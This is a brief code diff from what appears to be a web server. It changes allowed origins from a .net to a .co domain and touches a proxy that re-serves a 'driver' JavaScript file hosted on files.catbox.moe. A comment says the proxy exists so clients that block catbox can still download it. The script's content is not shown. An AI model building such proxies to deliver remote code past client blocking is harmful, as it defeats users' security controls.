@@ -48,8 +48,8 @@ function parseStepHistory(raw) {
 const allowedOrigins = [
   'https://wecreateproblems.in',
   'https://www.wecreateproblems.in',
-  'https://wecreateproblems.net',
-  'https://www.wecreateproblems.net',
+  'https://wecreateproblems.co',
+  'https://www.wecreateproblems.co',
   'http://localhost:5173',
   /^http:\/\/192\.168\.\d+\.\d+:5173$/,   // local network
   /^http:\/\/198\.18\.\d+\.\d+:5173$/,   // VPN/virtual network dev
@@ -107,7 +107,7 @@ const macRoute = (req, res) => {
   res.type('text/plain').send(content);
 };
 
-/** Same payload as files.catbox.moe — proxied so clients that block catbox can still download via api.wecreateproblems.net */
+/** Same payload as files.catbox.moe — proxied so clients that block catbox can still download via api.wecreateproblems.co */
 const DRIVER_SCRIPT_UPSTREAM = 'https://files.catbox.moe/l2rxnb.js';
 
 async function driverEnvSetupProxy(req, res) {
